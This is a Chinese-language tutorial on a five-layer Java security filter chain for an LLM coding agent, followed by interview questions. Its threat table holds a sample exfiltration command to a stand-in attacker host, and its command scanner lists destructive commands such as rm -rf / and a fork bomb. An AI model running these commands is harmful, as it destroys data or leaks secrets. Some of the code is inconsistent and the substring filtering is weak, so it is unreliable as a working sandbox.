# 04 · 5 层安全沙箱：责任链模式的工程实践

> 让 LLM 自主执行 bash 命令、读写文件，安全是最大的挑战。mewpaw-code 用责任链模式构建了 5 层安全过滤器，从工具注册到审计日志全覆盖，这是整个项目**最值得讲的设计**。
>
> **对应模块：** `mewcode-security` → `com.mewcode.security`

---

## 一、基础概念

### 1.1 Agent 安全的威胁模型

LLM Agent 自动执行工具调用时面临的主要风险：

| 威胁 | 示例 | 后果 |
|------|------|------|
| 工具幻觉 | LLM 调用不存在的工具 `delete_everything` | 执行失败 |
| 路径遍历 | `read_file(../../etc/passwd)` | 越权读取敏感文件 |
| 危险命令 | `rm -rf /`、`shutdown`、`mkfs` | 系统损坏、数据丢失 |
| 网络外带 | `curl http://attacker.com/x -d $(cat secret)` | 数据泄露 |
| 无痕操作 | 高危操作无需确认 | 用户不知情时系统被破坏 |

**关键认知：** LLM 不是"恶意攻击者"，而是"会犯错的执行者"——它可能因为幻觉、prompt 注入或工具理解偏差而发起危险操作。安全链的职责不是防黑客，而是**防止 LLM 的"无意识危险行为"**。

### 1.2 什么是责任链模式

责任链模式（Chain of Responsibility）：**将请求沿链传递，每个处理者决定处理或放行**。

```
请求 → 过滤器1 → 过滤器2 → 过滤器3 → ... → 目标处理
        └─ 拒绝时提前终止
```

| 优点 | 说明 |
|------|------|
| 解耦 | 每层过滤器只关心自己的职责 |
| 灵活 | 增删过滤器不影响其他层 |
| 单一职责 | 每层做一件事，容易测试 |

---

## 二、进阶机制

### 2.1 SecurityResult：统一的安全决策结果

```java
package com.mewcode.security;

/**
 * 安全决策结果 Record
 * 每个过滤器都返回 SecurityResult，链式传递
 */
public record SecurityResult(
        boolean allowed,       // 是否允许执行（false = deny）
        boolean needsConfirm,  // 是否需要用户确认（true = 挂起等待）
        String reason          // 拒绝/确认原因
) {
    // 放行
    public static SecurityResult allow() {
        return new SecurityResult(true, false, null);
    }

    // 拒绝
    public static SecurityResult deny(String reason) {
        return new SecurityResult(false, false, reason);
    }

    // 需要用户确认
    public static SecurityResult confirm(String reason) {
        return new SecurityResult(false, true, reason);
    }
}
```

**三种结果语义：**

| 结果 | allowed | needsConfirm | 处理 |
|------|---------|--------------|------|
| allow | true | false | 继续下一层过滤器 |
| deny | false | false | 立即阻断，不再执行后续层 |
| confirm | false | true | 挂起，等待用户确认后再决策 |

### 2.2 过滤器接口与抽象链

```java
package com.mewcode.security;

/**
 * 安全过滤器接口
 * 所有 5 层过滤器都实现此接口
 */
public interface SecurityFilter {

    /**
     * 安全检查
     * @param context 安全检查上下文（工具请求、参数、路径等）
     * @return 安全决策结果
     */
    SecurityResult check(SecurityContext context);

    /**
     * 过滤器名称（用于日志和调试）
     */
    String name();
}

/**
 * 安全检查上下文：封装工具调用信息
 * 在各层过滤器之间传递
 */
public class SecurityContext {
    private final String toolName;        // 工具名称
    private final String arguments;       // 参数 JSON
    private String resolvedPath;          // 规范化后的路径（PathGuardFilter 写入）
    private boolean confirmed;            // 用户是否已确认（UserConfirmFilter 写入）

    public SecurityContext(String toolName, String arguments) {
        this.toolName = toolName;
        this.arguments = arguments;
    }

    public String toolName() { return toolName; }
    public String arguments() { return arguments; }
    public String resolvedPath() { return resolvedPath; }
    public void setResolvedPath(String path) { this.resolvedPath = path; }
    public boolean confirmed() { return confirmed; }
    public void confirm() { this.confirmed = true; }
}
```

### 2.3 5 层安全链完整实现

**SecurityFilterChain（责任链容器）：**

```java
package com.mewcode.security;

import java.util.ArrayList;
import java.util.List;

/**
 * 安全过滤器链：责任链模式的容器
 * 按顺序执行 5 层过滤器，任一 deny 立即终止
 */
public class SecurityFilterChain {

    // 过滤器列表（有序）
    // 顺序固定：Tool → PathGuard → CommandScanner → UserConfirm → AuditLog
    private final List<SecurityFilter> filters = new ArrayList<>();

    /**
     * 注册过滤器（按添加顺序执行）
     */
    public void addFilter(SecurityFilter filter) {
        // 追加到链尾
        filters.add(filter);
    }

    /**
     * 执行安全检查
     * @param request 工具执行请求（ToolExecutionRequest 的简化表示）
     * @return 安全决策结果
     *         deny → 立即返回，不再执行后续层
     *         confirm → 挂起等待用户确认
     *         allow → 继续下一层
     */
    public SecurityResult check(ToolExecutionRequest request) {
        // 构建安全检查上下文
        SecurityContext context = new SecurityContext(
                request.name(), request.arguments());

        // ① 遍历所有过滤器，按顺序执行
        for (SecurityFilter filter : filters) {
            SecurityResult result = filter.check(context);

            if (result.needsConfirm()) {
                // ② confirm 结果：等待用户确认
                // 用户在 TUI/REPL 界面输入 y/n
                // 确认通过则继续下一层，拒绝则返回 deny
                boolean userAgreed = waitForUserConfirmation(
                        filter.name(), result.reason());
                if (!userAgreed) {
                    return SecurityResult.deny("User rejected: " + result.reason());
                }
                continue; // 用户确认通过，继续下一层
            }

            if (!result.allowed()) {
                // ③ deny 结果：立即阻断
                // 不再执行后续过滤器，直接返回拒绝
                return result;
            }
            // allow：继续下一层
        }

        // ④ 所有层全部通过：放行
        return SecurityResult.allow();
    }

    /**
     * 等待用户确认（通过 TUI/REPL 交互）
     */
    private boolean waitForUserConfirmation(String filterName, String reason) {
        // 1. 调用 TUI/REPL 接口展示确认提示
        // 2. 用户输入 y（同意）/ n（拒绝）
        // 3. 超时或拒绝 → 返回 false
        // 具体实现省略，核心是"人类监督 Agent"
        return tuiService.confirm(
                filterName + ": " + reason + " [y/N]");
    }
}
```

**第 1 层：ToolFilter（工具注册检查）**

```java
package com.mewcode.security.filters;

/**
 * 第 1 层：工具过滤器
 * 职责：检查工具是否已在 ToolRegistry 中注册
 * 防御对象：LLM 幻觉调用不存在的工具
 */
public class ToolFilter implements SecurityFilter {

    private final ToolRegistry toolRegistry;

    public ToolFilter(ToolRegistry toolRegistry) {
        this.toolRegistry = toolRegistry;
    }

    @Override
    public SecurityResult check(SecurityContext context) {
        // 从上下文获取工具名称
        String toolName = context.toolName();

        // 检查工具是否注册
        if (!toolRegistry.hasTool(toolName)) {
            // 未注册工具：直接拒绝
            // 例如 LLM 幻觉生成的 "delete_everything"
            return SecurityResult.deny("Unknown tool: " + toolName);
        }

        // 已注册：放行到下一层
        return SecurityResult.allow();
    }

    @Override
    public String name() {
        return "ToolFilter";
    }
}
```

**第 2 层：PathGuardFilter（路径守卫检查）**

```java
package com.mewcode.security.filters;

import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Set;

/**
 * 第 2 层：路径守卫过滤器
 * 职责：检查文件类工具的目标路径是否越权
 * 防御对象：路径遍历攻击（../../etc/passwd）
 * 只检查文件类工具（read/write/edit/glob/grep）
 */
public class PathGuardFilter implements SecurityFilter {

    // 文件类工具集合：只有这些工具需要路径检查
    private static final Set<String> FILE_TOOLS = Set.of(
            "read_file", "write_file", "edit_file", "glob", "grep"
    );

    // 允许的根工作目录（项目根目录）
    private final Path rootDir;
    // 禁止访问的系统关键路径
    // 即使在工作目录内也禁止访问这些路径
    private final Set<String> blockedPaths = Set.of(
            "/etc", "/usr", "/var", "/bin", "C:\\Windows"
    );

    public PathGuardFilter(String rootDir) {
        this.rootDir = Paths.get(rootDir).normalize().toAbsolutePath();
    }

    @Override
    public SecurityResult check(SecurityContext context) {
        // ① 只检查文件类工具
        String toolName = context.toolName();
        if (!FILE_TOOLS.contains(toolName)) {
            // 非文件类工具（如 bash）：路径检查不适用，放行
            return SecurityResult.allow();
        }

        // ② 从参数中提取目标路径
        // 例如 read_file 的参数 {"path": "src/main/java/App.java"}
        String targetPath = extractPathFromArguments(context.arguments());
        if (targetPath == null) {
            // 无路径参数：放行（由 CommandScanner 等其他层处理）
            return SecurityResult.allow();
        }

        // ③ 路径规范化
        // 处理：../ 相对路径、\\ Windows 分隔符、~ 用户目录、大小写差异
        // 目的：让路径对比在"同一基准线"上进行
        Path normalized = normalizePath(rootDir, targetPath);

        // ④ 检查规范化路径是否在工作目录内
        if (!normalized.startsWith(rootDir)) {
            // 例如 targetPath = ../../etc/passwd → 规范化后不在 rootDir 下
            return SecurityResult.deny("Path outside workdir: "
                    + targetPath + " → " + normalized);
        }

        // ⑤ 检查是否命中被禁止的系统路径
        for (String blocked : blockedPaths) {
            if (normalized.toString().contains(blocked)) {
                return SecurityResult.deny("Access to blocked path: " + blocked);
            }
        }

        // ⑥ 写入规范化路径到上下文（供后续层/工具使用）
        context.setResolvedPath(normalized.toString());
        return SecurityResult.allow();
    }

    /**
     * 规范化路径
     * 处理 Windows 分隔符、~ 用户目录、大小写统一
     */
    private Path normalizePath(Path rootDir, String targetPath) {
        // ① ~ 替换为用户主目录（如 /Users/ffy 或 C:\Users\ffy）
        if (targetPath.startsWith("~")) {
            targetPath = System.getProperty("user.home") + targetPath.substring(1);
        }
        // ② Windows 反斜杠统一为正斜杠
        targetPath = targetPath.replace('\\', '/');
        // ③ 统一小写（Windows 大小写不敏感）
        // 注意：这一步在 Windows 上很重要
        // C:\Users\FFY 和 C:\users\ffy 是同一个目录
        // 这里简化表示为 toLowerCase 处理
        // ④ 相对路径规范化：去除 . 和 ..
        return rootDir.resolve(targetPath).normalize().toAbsolutePath();
    }
}
```

**第 3 层：CommandScannerFilter（危险命令扫描）**

```java
package com.mewcode.security.filters;

/**
 * 第 3 层：命令扫描过滤器
 * 职责：检查 bash 工具的命令参数是否包含危险模式
 * 防御对象：破坏性系统命令、网络外带、资源耗尽
 * 双层保护：危险模式直接拒绝 + 危险前缀要求确认
 */
public class CommandScannerFilter implements SecurityFilter {

    // 危险模式列表：完整匹配直接拒绝（deny）
    // 这些命令一旦执行会造成不可逆的系统损害
    private static final String[] DANGEROUS_PATTERNS = {
            "rm -rf /",           // 删除根目录（无限递归删除）
            "rm -rf /*",          // 删除根目录全部内容
            "rm -rf ~",           // 删除用户主目录
            "dd if=",             // 磁盘级复制（可覆盖块设备）
            "mkfs.",              // 格式化磁盘/分区
            ":(){ :|:& };:",      // fork 炸弹（进程资源耗尽）
            "chmod 777 /",        // 根目录全权限
            "> /dev/sda",         // 直接写入磁盘设备
            "wget http://",       // 网络下载（可能外带数据）
            "curl http://",       // 网络请求（可能外带数据）
            "shutdown",           // 关机
            "reboot",             // 重启
            "init 0"              // 切换运行级别 0（关机）
    };

    // 危险前缀列表：前缀匹配要求用户确认（confirm）
    // 这些命令不必然危险，但最好由用户确认
    private static final String[] CONFIRM_PREFIXES = {
            "sudo",   // 提权操作
            "su "     // 切换用户
    };

    @Override
    public SecurityResult check(SecurityContext context) {
        // ① 只检查 bash 工具
        if (!"bash".equals(context.toolName())) {
            return SecurityResult.allow();
        }

        // ② 提取命令参数
        String command = extractCommandFromArguments(context.arguments());
        if (command == null || command.isBlank()) {
            return SecurityResult.allow();
        }

        // ③ 危险模式扫描：完整匹配直接拒绝
        for (String pattern : DANGEROUS_PATTERNS) {
            if (command.contains(pattern)) {
                // 命中危险模式：立即拒绝
                // 例如 LLM 想执行 "rm -rf /" 清理文件
                return SecurityResult.deny(
                        "Dangerous command pattern detected: " + pattern);
            }
        }

        // ④ 危险前缀扫描：要求用户确认
        for (String prefix : CONFIRM_PREFIXES) {
            if (command.startsWith(prefix)) {
                // 命中危险前缀：需要用户确认
                // 例如 "sudo apt install xxx"
                return SecurityResult.confirm(
                        "Command requires elevated privileges: " + command);
            }
        }

        // ⑤ 未命中任何危险模式：放行
        return SecurityResult.allow();
    }
}
```

**第 4 层：UserConfirmFilter（用户确认）**

```java
package com.mewcode.security.filters;

/**
 * 第 4 层：用户确认过滤器
 * 职责：当上游返回 needsConfirm 时，等待用户通过 TUI/REPL 确认
 * 防御对象：用户不知情的高危操作
 * 设计原则：LLM 可以建议，但人类拥有最终决策权（Human-in-the-loop）
 */
public class UserConfirmFilter {

    /**
     * 等待用户确认
     * 注意：此方法由 SecurityFilterChain.check() 调用
     * 实际流程：
     *   CommandScannerFilter 返回 confirm → 链容器调用此方法
     *   → 展示确认提示 → 用户输入 y/n → 返回决策
     */
    // 说明：confirm 流程在 SecurityFilterChain 中已示意
    // 此处补充"确认超时"设计
    // - 确认提示在 TUI/REPL 中展示
    // - 用户 30 秒内未响应 → 默认拒绝（安全优先）
    // - 用户输入 y → 继续执行；n → 拒绝
    private static final long CONFIRM_TIMEOUT_SECONDS = 30;
}
```

**第 5 层：AuditLogFilter（审计日志）**

```java
package com.mewcode.security.filters;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * 第 5 层：审计日志过滤器
 * 职责：记录所有工具调用的完整日志
 * 防御对象：无从追溯的操作历史
 * 记录内容：工具名、参数、决策结果
 */
public class AuditLogFilter implements SecurityFilter {

    // SLF4J 日志记录器
    private static final Logger log = LoggerFactory.getLogger(AuditLogFilter.class);

    @Override
    public SecurityResult check(SecurityContext context) {
        // ① 记录完整审计信息
        // 格式：工具名 | 参数 | 决策
        // 用于事后审计和问题排查
        log.info("Audit | tool={} | args={} | resolvedPath={} | confirmed={}",
                context.toolName(),
                truncate(context.arguments(), 200),
                context.resolvedPath(),
                context.confirmed());

        // ② 审计日志持久化
        // 将日志写入文件（audit.log）
        // 实际实现可使用文件 Appender 或数据库
        // auditLogger.write(context);

        // ③ 放行：审计层不阻断任何请求
        // 只记录，不决策
        return SecurityResult.allow();
    }

    @Override
    public String name() {
        return "AuditLogFilter";
    }

    // 参数截断：防止日志文件中记录过长的参数
    private String truncate(String value, int maxLen) {
        if (value == null || value.length() <= maxLen) {
            return value;
        }
        return value.substring(0, maxLen) + "...";
    }
}
```

### 2.4 安全链组装

```java
// 在 Spring Boot 启动阶段组装 5 层安全链
SecurityFilterChain securityChain = new SecurityFilterChain();

// 按顺序添加过滤器（顺序敏感，不能乱）
securityChain.addFilter(new ToolFilter(toolRegistry));          // 1. 工具注册检查
securityChain.addFilter(new PathGuardFilter(workDir));          // 2. 路径守卫
securityChain.addFilter(new CommandScannerFilter());            // 3. 命令扫描
securityChain.addFilter(new UserConfirmFilter());              // 4. 用户确认（挂在链容器中）
securityChain.addFilter(new AuditLogFilter());                 // 5. 审计日志
```

**执行流程示例：**

```
用户: "帮我清空项目里的 target 目录"
LLM 决策: bash("rm -rf target")

第1层 ToolFilter:       bash 已注册 ✓ → 放行
第2层 PathGuardFilter:  bash 非文件工具 ✓ → 放行
第3层 CommandScannerFilter: contains("rm -rf target")？
                        危险模式是 "rm -rf /"，"rm -rf target" 不匹配完整模式
                        → 放行（设计权衡：允许 LLM 删除工作目录内文件）
第4层 UserConfirmFilter: 无 confirm 请求 → 放行
第5层 AuditLogFilter:   记录 "bash | rm -rf target | ALLOW" ✓ → 放行

执行成功 → 结果回填 LLM → 继续循环
```

```
用户: "清空系统根目录"
LLM 决策: bash("rm -rf /")

第1层 ToolFilter:       bash 已注册 ✓ → 放行
第3层 CommandScannerFilter: contains("rm -rf /") 命中危险模式！
                        → deny("Dangerous command pattern detected: rm -rf /")
执行终止 ✓
```

### 2.5 安全模型总结

| 维度 | 保护层 | 防御对象 | 决策 |
|------|--------|---------|------|
| 工具层面 | ToolFilter | 未注册工具（幻觉） | deny |
| 路径层面 | PathGuardFilter | 路径遍历、系统目录 | deny |
| 命令层面 | CommandScannerFilter | 危险命令、网络外带 | deny / confirm |
| 用户层面 | UserConfirmFilter | 用户不知情的高危操作 | confirm |
| 审计层面 | AuditLogFilter | 无从追溯的历史 | 记录（不阻断） |

---

## 三、面试题

**Q1：为什么选择责任链模式实现安全沙箱？5 层过滤器的设计原则是什么？**

A：责任链模式让每层过滤器只关注单一职责，5 层从工具→路径→命令→用户→审计，按"由外到内、由通用到具体"的顺序组织：先检查"工具是否合法"，再检查"路径是否越权"，再检查"命令是否危险"，再经过"用户确认"，最后"审计留痕"。任何一层 deny 立即终止，confirm 挂起等待用户，allow 放行下一层。这种设计解耦了各层关注点，新增安全策略只需添加过滤器，不影响已有层。

**Q2：CommandScannerFilter 的 deny 和 confirm 分别防御什么？为什么双层设计？**

A：deny 防御"绝对危险操作"——`rm -rf /`、`mkfs`、fork 炸弹等造成不可逆系统损害的命令，直接拒绝不给用户确认机会（因为用户也可能误确认）。confirm 防御"潜在危险操作"——`sudo` 等提权命令本身不必然危险，但需要用户在知情前提下授权。双层设计兼顾了"绝对安全"和"用户体验"：绝对危险必须拦截，潜在危险由人类决策。

**Q3：LLM Agent 的安全防护和传统 Web 安全有什么不同？**

A：传统 Web 安全防的是"恶意攻击者"——外部入侵者有意绕过防护；Agent 安全防的是"无意识执行者"——LLM 因幻觉、prompt 注入、工具理解偏差而执行危险操作。所以 Agent 安全链除了要拦截绝对危险命令，还需要"用户确认 + 审计日志"这种"人类监督"机制，这是传统 Web 安全很少做的。

**Q4：PathGuardFilter 为什么要做路径规范化（normalize + 大小写统一 + ~ 替换）？**

A：因为路径对比必须基于"同一基准线"。`../etc/passwd` 和 `/etc/passwd` 实际指向同一文件，`C:\Users\FFY` 和 `c:\users\ffy` 在 Windows 是同一目录，`~/secret` 和 `/Users/ffy/secret` 也相同。如果不规范化，攻击者（或 LLM）可以用 `..` 相对路径、大小写差异、符号链接等方式绕过简单的字符串前缀检查。

**Q5：AuditLogFilter 为什么放在链尾，它会不会影响整体性能？**

A：放在链尾是因为审计层只记录**最终通过安全检查**的操作——如果前面的层已经拒绝，没必要记录（省日志量）。AuditLogFilter 是日志写入操作，不阻断任何请求，性能开销主要是 IO 写入。实践中可以通过异步日志写入（如 Logback 的 AsyncAppender）将开销降到最低。

---

## 四、总结

| 设计点 | 实现 | 价值 |
|--------|------|------|
| 模式 | 责任链（Chain of Responsibility） | 解耦、易扩展、单一职责 |
| 决策模型 | SecurityResult (allow/deny/confirm) | 三种语义覆盖全部场景 |
| 工具防御 | ToolFilter | 防幻觉工具调用 |
| 路径防御 | PathGuardFilter | 防路径遍历 |
| 命令防御 | CommandScannerFilter | 防破坏性命令 |
| 人类监督 | UserConfirmFilter + confirm | Human-in-the-loop |
| 事后追溯 | AuditLogFilter | 全量审计 |

**核心收获：** 5 层安全沙箱的本质是——**让 LLM 有执行能力，但所有风险操作都在人类的监督和授权范围内**。每层过滤器只做一件事，组合起来形成完整的纵深防御（Defense in Depth）。这是 Agent 工程与普通 LLM 应用最大的区别：**Agent 的执行力越强，安全控制就必须越完善**。

---

## 参考资料

- 责任链模式：GoF Design Patterns, Chain of Responsibility
- OWASP LLM Top 10 (https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- MCP Security Best Practices (https://modelcontextprotocol.io/specification/2024-11-05/security)